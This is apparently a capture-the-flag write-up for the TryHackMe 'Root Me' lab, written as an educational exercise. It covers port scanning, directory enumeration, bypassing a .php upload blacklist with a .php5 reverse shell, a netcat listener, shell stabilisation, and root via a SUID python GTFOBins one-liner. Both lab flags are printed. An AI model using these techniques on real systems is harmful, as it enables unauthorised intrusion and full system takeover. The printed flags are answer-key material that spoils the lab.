# <div align="center">[Root Me](https://tryhackme.com/room/rrootme)</div>

## Step 1: Reconnaissance

We start with a basic Nmap scan to identify open ports and services running on the target machine.

```bash
nmap <ip> -sV -sC
```

### Scan Results:

```bash
nmap 10.10.15.83 -sV -sC 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-07 11:10 IST
Nmap scan report for 10.10.15.83
Host is up (0.15s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)
|   256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)
|_  256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: HackIT - Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

---

## Step 2: Web Enumeration

![Upload Panel](https://github.com/user-attachments/assets/a5791bd9-2b57-42a5-9274-53fb2bce9a57)

For directory enumeration, I used `dirsearch` to find hidden files and directories on the web server.

```bash
dirsearch -u 10.10.15.83
```

### Results:

```bash
dirsearch -u 10.10.15.83

_|. _ _  _  _  _ _|_    v0.4.3
(_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Target: http://10.10.15.83/

[11:10:57] 301 -  307B  - /js  ->  http://10.10.15.83/js/
[11:11:01] 403 -  276B  - /.htaccessBAK
[11:11:01] 403 -  276B  - /.htpasswd_test
[11:11:01] 403 -  276B  - /.php
[11:11:32] 301 -  308B  - /css  ->  http://10.10.15.83/css/
[11:11:45] 200 -  463B  - /js/
[11:11:56] 301 -  310B  - /panel  ->  http://10.10.15.83/panel/
[11:11:56] 200 -  388B  - /panel/
[11:12:06] 403 -  276B  - /server-status
[11:12:16] 301 -  312B  - /uploads  ->  http://10.10.15.83/uploads/
[11:12:16] 200 -  404B  - /uploads/

Task Completed
```

## Step 3: Finding Upload Page

We found a hidden page `/panel/` which has a file upload functionality.

### Upload Page:

![Upload Restriction](https://github.com/user-attachments/assets/390c5728-be75-4daa-82a1-83dd68b351c7)

---

## File Upload Restrictions

After testing multiple file types like `.jpg`, `.txt`, and `.png`, it was confirmed that `.php` files were restricted.

![Upload Reverse Shell](https://github.com/user-attachments/assets/0829c5f3-101f-4fda-bb22-16cedbe42a88)

---

## Uploading Reverse Shell

To bypass the restriction and get a reverse shell, we use a PHP reverse shell from [Pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell).

Download the reverse shell using:

![Reverse Shell](https://github.com/user-attachments/assets/19f28f5b-098b-41a4-b576-53322a3084ab)

```bash
git clone https://github.com/pentestmonkey/php-reverse-shell
cd php-reverse-shell
nano php-reverse-shell.php 
```
![image](https://github.com/user-attachments/assets/dc7b1ca7-5c11-4d95-9aeb-8db32fb7de0e)

Replace the IP with your THM VPN IP.

---

### Uploading the Reverse Shell:

![Upload Reverse Shell](https://github.com/user-attachments/assets/0829c5f3-101f-4fda-bb22-16cedbe42a88)

---

## Setting up Listener

In a separate terminal, start a Netcat listener:

```bash
nc -lvnp <your-port>
```

Once the file is uploaded successfully, trigger the shell by navigating to the uploaded file path.

---

### Reverse Shell Captured:

![Reverse Shell](https://github.com/user-attachments/assets/19f28f5b-098b-41a4-b576-53322a3084ab)
Let upload a shell i rename as shell.php
![image](https://github.com/user-attachments/assets/1e8ee09a-173d-44bc-bee5-9c90655200c4)

As i upload it not permiting me to upload to .php format

![image](https://github.com/user-attachments/assets/87692c48-ea83-42cc-a738-3f47bc8f53a9)

As i not allwoing us to upoad .php we need to chnage the version bez the black listing has mention .php. just chnae and version and upload
```
cp -r php-reverse-shell.php shell.php5
```
upload

![image](https://github.com/user-attachments/assets/0b6bac2a-fc81-4d6c-b336-78e4643b286d)

After we upload we need to excute this.
as we find upload directory `uploads` head to that 

![image](https://github.com/user-attachments/assets/2836cc50-1d92-4c5b-a67b-abd29b7e4600)

Clik on reverse shell 
![image](https://github.com/user-attachments/assets/9605f5ab-34ff-4dc1-991b-e1c2aa635cbd)

As we got the shell
![image](https://github.com/user-attachments/assets/016fa166-6cc5-4d2c-a3db-a15411a2e5f9)

![image](https://github.com/user-attachments/assets/697ef3e1-c4fb-4a65-af06-359cda6b35bb)

Next step is to find User flag
```
nc -lnvp 1234
Listening on 0.0.0.0 1234
Connection received on 10.10.184.38 58302
Linux rootme 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 06:47:13 up 4 min,  0 users,  load average: 0.29, 0.37, 0.18
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
```
Let swape a stable shell
```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
```
Listening on 0.0.0.0 1234
Connection received on 10.10.15.83 51172
Linux rootme 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 06:21:30 up 44 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@rootme:/$ 
```
Let find user flag as the web server is hosted
```
www-data@rootme:/$ cd /var/www     		
cd /var/wwwc
www-data@rootme:/var/www$cat user.txt
cat user.txt
THM{y0u_g0t_a_sh3ll}
www-data@rootme:/var/www$ 
```

```
THM{y0u_g0t_a_sh3ll}
```


Let look for a `SUID` file
```
find / -user root -perm /4000 2>/dev/null
```
```
find / -user root -perm /4000 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/traceroute6.iputils
/usr/bin/newuidmap
/usr/bin/newgidmap
/usr/bin/chsh
/usr/bin/python
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/pkexec
/snap/core/8268/bin/mount
/snap/core/8268/bin/ping
/snap/core/8268/bin/ping6
/snap/core/8268/bin/su
/snap/core/8268/bin/umount
/snap/core/8268/usr/bin/chfn
/snap/core/8268/usr/bin/chsh
/snap/core/8268/usr/bin/gpasswd
/snap/core/8268/usr/bin/newgrp
/snap/core/8268/usr/bin/passwd
/snap/core/8268/usr/bin/sudo
/snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/8268/usr/lib/openssh/ssh-keysign
/snap/core/8268/usr/lib/snapd/snap-confine
/snap/core/8268/usr/sbin/pppd
/snap/core/9665/bin/mount
/snap/core/9665/bin/ping
/snap/core/9665/bin/ping6
/snap/core/9665/bin/su
/snap/core/9665/bin/umount
/snap/core/9665/usr/bin/chfn
/snap/core/9665/usr/bin/chsh
/snap/core/9665/usr/bin/gpasswd
/snap/core/9665/usr/bin/newgrp
/snap/core/9665/usr/bin/passwd
/snap/core/9665/usr/bin/sudo
/snap/core/9665/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/9665/usr/lib/openssh/ssh-keysign
/snap/core/9665/usr/lib/snapd/snap-confine
/snap/core/9665/usr/sbin/pppd
/bin/mount
/bin/su
/bin/fusermount
/bin/ping
/bin/umount
www-data@rootme:/var/www$  
```

I got a odd file that is `/usr/bin/python`

Let search the priv esc on [gtfo bin](https://gtfobins.github.io/gtfobins/python)
search for python and suid

![image](https://github.com/user-attachments/assets/a40dcb94-7904-4fb2-9ccb-4d6d5a490839)

```
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```
Past this 
```
www-data@rootme:/$ python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
# 
```
Finding root flag.txt
```
# cat /root/root.txt
cat /root/root.txt
THM{pr1v1l3g3_3sc4l4t10n}
# 
```
